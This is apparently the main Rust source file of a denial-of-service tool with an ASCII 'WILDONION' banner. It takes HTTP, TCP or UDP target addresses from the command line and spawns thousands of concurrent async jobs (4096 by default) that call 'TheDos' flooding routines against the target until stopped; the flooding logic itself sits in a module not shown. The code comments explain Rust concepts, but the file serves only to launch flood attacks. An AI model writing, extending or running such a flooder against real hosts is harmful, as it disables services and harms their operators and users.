

/*






 █     █░ ██▓ ██▓    ▓█████▄  ▒█████   ███▄    █  ██▓ ▒█████   ███▄    █ 
▓█░ █ ░█░▓██▒▓██▒    ▒██▀ ██▌▒██▒  ██▒ ██ ▀█   █ ▓██▒▒██▒  ██▒ ██ ▀█   █ 
▒█░ █ ░█ ▒██▒▒██░    ░██   █▌▒██░  ██▒▓██  ▀█ ██▒▒██▒▒██░  ██▒▓██  ▀█ ██▒
░█░ █ ░█ ░██░▒██░    ░▓█▄   ▌▒██   ██░▓██▒  ▐▌██▒░██░▒██   ██░▓██▒  ▐▌██▒
░░██▒██▓ ░██░░██████▒░▒████▓ ░ ████▓▒░▒██░   ▓██░░██░░ ████▓▒░▒██░   ▓██░
░ ▓░▒ ▒  ░▓  ░ ▒░▓  ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
  ▒ ░ ░   ▒ ░░ ░ ▒  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░░   ░ ▒░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
  ░   ░   ▒ ░  ░ ░    ░ ░  ░ ░ ░ ░ ▒     ░   ░ ░  ▒ ░░ ░ ░ ▒     ░   ░ ░ 
    ░     ░      ░  ░   ░        ░ ░           ░  ░      ░ ░           ░ 
                      ░                                                  




*/


use clap::Parser;
use futures::executor::block_on;
use regex::Regex;
use is_type::Is;
use std::future::Future;
use std::thread;
use std::sync::{Arc, Mutex, mpsc as std_mpsc};
use std::process;
use hyper::{Client, Uri, Body, Request, Response};
use rand::Rng;
use borsh::{BorshDeserialize, BorshSerialize};
use log::{info, error, LevelFilter};
use tokio::net::{TcpListener, TcpStream, UdpSocket}; //-- async tcp listener and stream
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::sync::mpsc;
use uuid::Uuid;
use crate::scheduler::{sync::ThreadPool as NativeSyncWorker, sync::Pool as RayonSyncWorker, _async::Worker as AsyncWorker};
use utils;





pub mod attack;
pub mod scheduler;






#[derive(Parser, Default, Debug)]
#[clap(about, version, author)]
struct Arguments{
    #[clap(long)]
    pub http_addr: Option<String>, // the default attack
    #[clap(long)]
    pub tcp_addr: Option<String>, // it can be empty on cli
    #[clap(long)]
    pub udp_addr: Option<String>, // it can be empty on cli
    #[clap(long)]
    pub jobs: Option<usize>,
}






#[tokio::main(flavor="multi_thread", worker_threads=10)] //// use the tokio multi threaded runtime by spawning 10 threads in overall
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync + 'static>>{ // implementing the Error trait for any type that might cause to an error at runtime; traits doesn't have any fixed size at compile time thus we must put them inside a Box and since we're implementing it for also an unknown size type we must put a dyn keyword behind it







    
    // cli args parsing 
    
    let arg = Arguments::parse();
    let mut url = arg.http_addr;
    let mut n_jobs = arg.jobs.unwrap_or(4096);
    let mut tcp_addr = arg.tcp_addr;
    let mut udp_addr = arg.udp_addr;
    let mut async_worker = AsyncWorker::new();
    let native_sync_worker = NativeSyncWorker::spawn(n_jobs);
    let rayon_sync_worker = RayonSyncWorker::new();
    
    

    



    
    //// --------------------- start http attack

    if let Some(mut url) = url{

        let re = Regex::new(r#"\\"(https?\\"://)?([^/]*)/?.*"#).unwrap(); // https://stackoverflow.com/a/54061205
        let url_with_slash = &format!("{}/", url.clone()); // making a longer lifetime of the url since is outside of the following if 
        if !url.ends_with("/"){
            // url = &format!("{}/", url.clone()); // when we initialize a new url with format! it's valid as long as we're inside the if and once we get outta of this scope url will no longer be valid
            url = url_with_slash.to_string();
        } 
    
        let host = if let Some(host) = re.captures(&url){
            Some(host.get(2).unwrap().as_str().to_owned()) // to_owned() will convert the borrowed type to its original type and here in our case is the String itself since also anything in parentheses () inside the defined pattern will be a capture group
        } else{
            Some("".to_string())
        };
        let parsed_url = url.parse::<Uri>().unwrap();
        assert_eq!(parsed_url.scheme_str(), Some("http")); // make sure the http is correct        


        let thedos = attack::TheDos::new(Some(url.clone()), None, None, host.clone(), n_jobs); // pass String by reference convert them to &str automatically

        for p in 0..n_jobs{

            println!("➔ job {} finished at {}", p, chrono::Local::now());
            let mut thedos = thedos.clone();
        
            
            // ----------------
            // sync threadpools
            // ----------------
            // native_sync_worker.execute(move ||{
            //     block_on(thedos.httpcall());
            // });
            //
            // There is no guaranteed order of execution for spawns, 
            // given that other threads may steal tasks at any time. 
            // However, they are generally prioritized in a LIFO order 
            // on the thread from which they were spawned. Other threads 
            // always steal from the other end of the deque, like FIFO order. 
            // The idea is that "recent" tasks are most likely to be fresh 
            // in the local CPU's cache, while other threads can steal older "stale" tasks.
            // rayon_sync_worker.spawn(move ||{
            //     block_on(thedos.httpcall()); 
            // });
            // 
            //
            // ----------------------
            // async threadpool worker
            // ----------------------
            async_worker.spawn(async move{
                thedos.httpcall().await;
                Ok(())
            }) // if Ok(()) and worker spawn() method went wrong error would be Box<dyn std::err::Error + Send + Sync 'static>
        
        }
    
    }



    





    //// --------------------- start tcp attack

    if let Some(_) = tcp_addr{
       
        let thedos = attack::TheDos::new(None, tcp_addr, None, None, n_jobs); // pass String by reference convert them to &str automatically

        for p in 0..n_jobs{
            println!("➔ job {} finished at {}", p, chrono::Local::now());
            let mut thedos = thedos.clone();
            async_worker.spawn(async move{
                thedos.tcpcall().await;
                Ok(())
            }) // if Ok(()) and worker spawn() method went wrong error would be Box<dyn std::err::Error + Send + Sync 'static>
        }
    
    }








    //// --------------------- start udp attack
    
    if let Some(_) = udp_addr{
       
        let thedos = attack::TheDos::new(None, None, udp_addr, None, n_jobs); // pass String by reference convert them to &str automatically
        
        for p in 0..n_jobs{
            println!("➔ job {} finished at {}", p, chrono::Local::now());
            let mut thedos = thedos.clone();
            async_worker.spawn(async move{
                thedos.udpcall().await;
                Ok(())
            }) // if Ok(()) and worker spawn() method went wrong error would be Box<dyn std::err::Error + Send + Sync 'static>
        }
    
    }

    

    

    tokio::signal::ctrl_c().await?;
    println!("ctrl-c received");

            
    async_worker.execute().await // wait for all the workers of this worker to complete if there were any



}

